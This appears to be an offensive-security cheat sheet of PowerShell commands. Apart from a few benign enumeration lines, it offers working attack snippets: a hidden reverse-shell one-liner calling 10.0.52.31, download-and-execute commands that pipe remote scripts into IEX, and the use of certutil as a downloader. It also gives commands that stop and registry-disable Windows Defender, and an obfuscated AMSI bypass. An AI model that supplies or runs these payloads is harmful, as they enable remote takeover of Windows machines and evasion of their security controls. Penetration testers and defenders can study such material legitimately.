---
description: >-
  Overall, PowerShell is a versatile and powerful tool for managing Windows
  systems and automating tasks.
---

# Powershell

#### Enumeration

```powershell
# Windows defender status
Get-MpComputerStatus

# Get hotfixes
Get-HotFix | ft -AutoSize

# Installed programs
Get-WmiObject -Class Win32_Product |  select Name, Version

# Get process
get-process -Id 3324
```

#### Reverse shell

```powershell
# One-liner
os.system("cmd /c powershell -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('10.0.52.31',1377);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1 | Out-String );$r=$e+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\"") return x
```

#### Download files

```powershell
# This wil run and execute file
(New-Object Net.WebClient).Downloadstring('http://10.0.52.31:8000/file.ps1')|IEX; 
IEX (iwr 'http://10.10.14.3:443/procmon.ps1') 

# WGET
wget http://10.0.01:8000/file.ps -Outfile file.ps1

# Certutil
certutil.exe -urlcache -f http://10.0.01:8000/file.ps1 file.ps1
```

#### Defender

```powershell
# Check status
Get-MpComputerStatus
(Get-MpComputerStatus).RealTimeProtectionEnabled

# Stop defender
net stop WinDefend

# Disable using registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

<details>

<summary>AMSI Error based bypass</summary>

```
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');

$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);

$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);
```

</details>

#### Run powershell script from server

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```





